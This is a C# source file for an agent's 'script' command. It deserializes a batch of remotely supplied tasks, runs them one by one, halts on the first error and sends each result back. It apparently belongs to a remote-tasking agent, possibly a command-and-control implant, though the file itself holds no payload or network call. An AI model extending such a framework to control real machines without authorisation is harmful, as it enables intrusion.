using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Agent.Models;
using BinarySerializer;
using Shared;

namespace Agent.Commands
{
    public class ScriptedCommand : AgentCommand
    {
        public override CommandId Command => CommandId.Script;
        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
        {
            context.IsScripting = true;
            task.ThrowIfParameterMissing(ParameterId.Parameters);

            var comTasks = await task.GetParameter(ParameterId.Parameters).BinaryDeserializeAsync<List<AgentTask>>();

            foreach (var childTask in comTasks)
            {
                if (childTask.CommandId == CommandId.None)
                    break;

                var t = context.Agent.ExecuteTaskThreaded(context.Agent.GetCommand(childTask), childTask, context);
                t.Join();

                //command generate an error => stop executing
                context.Result.Id = task.Id;
                if (!string.IsNullOrEmpty(context.Result.Error))
                {
                    context.Error(context.Result.Error);
                    break;
                }


                await context.Agent.SendTaskResult(context.Result);
                context.ClearResult();
            }
        }
    }
}
